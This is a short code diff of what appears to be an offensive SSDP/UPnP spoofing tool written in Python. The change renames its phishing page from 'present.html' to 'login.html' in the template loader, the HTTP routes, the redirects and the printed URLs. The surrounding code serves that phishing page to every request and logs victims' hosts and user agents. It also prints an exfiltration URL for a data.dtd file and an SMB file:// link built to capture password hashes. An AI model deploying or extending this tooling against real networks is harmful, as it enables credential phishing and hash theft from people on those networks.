@@ -230,7 +230,7 @@ def build_class(upnp_args):
         the phishing page. The phishing page can optionally request an
         interactive logon if the "-b / --basic" has been specified.
 
-        The phishing page the devices SHOULD be requesting is 'present.html'
+        The phishing page the devices SHOULD be requesting is 'login.html'
         but we will serve it to all requests, in case a curious users sees the
         reference and browses there manually.
         """
@@ -272,7 +272,7 @@ def build_class(upnp_args):
             """
             variables = {'smb_server': smb_server,
                          'redirect_url': redirect_url}
-            file_in = open(template_dir + '/present.html')
+            file_in = open(template_dir + '/login.html')
             template = Template(file_in.read())
             phish_page = template.substitute(variables)
             return phish_page
@@ -353,7 +353,7 @@ def build_class(upnp_args):
                     else:
                         self.send_response(500)
                         self.wfile.write("Something happened.".encode())
-                elif self.path == '/present.html':
+                elif self.path == '/login.html':
                     self.send_response(200)
                     self.send_header('Content-type', 'text/html')
                     self.end_headers()
@@ -361,7 +361,7 @@ def build_class(upnp_args):
                 else:
                     # Return phishing page for everything else
                     self.send_response(301)
-                    self.send_header('Location', '/present.html')
+                    self.send_header('Location', '/login.html')
                     self.end_headers()
 
 
@@ -381,7 +381,7 @@ def build_class(upnp_args):
                 if redirect_url:
                     self.send_header('Location', '{}'.format(redirect_url))
                 else:
-                    self.send_header('Location', 'http://{}:{}/present.html'
+                    self.send_header('Location', 'http://{}:{}/login.html'
                                      .format(local_ip, local_port))
                 self.end_headers()
 
@@ -452,7 +452,7 @@ def build_class(upnp_args):
                 data += "               {} {}".format(verb, path)
                 print(data)
                 self.write_log(data)
-            elif 'present.html' in self.path:
+            elif 'login.html' in self.path:
                 print(PC.phish_box + "Host: {}, User-Agent: {}".format(
                     address, agent))
                 print("               {} {}".format(verb, path))
@@ -582,7 +582,7 @@ def print_details(args, local_ip, smb_server):
         local_ip, args.local_port)
     srv_url = 'http://{}:{}/ssdp/service-desc.xml'.format(
         local_ip, args.local_port)
-    phish_url = 'http://{}:{}/ssdp/present.html'.format(
+    phish_url = 'http://{}:{}/ssdp/login.html'.format(
         local_ip, args.local_port)
     exfil_url = 'http://{}:{}/ssdp/data.dtd'.format(local_ip, args.local_port)
     smb_url = 'file://///{}/smb/hash.jpg'.format(smb_server)
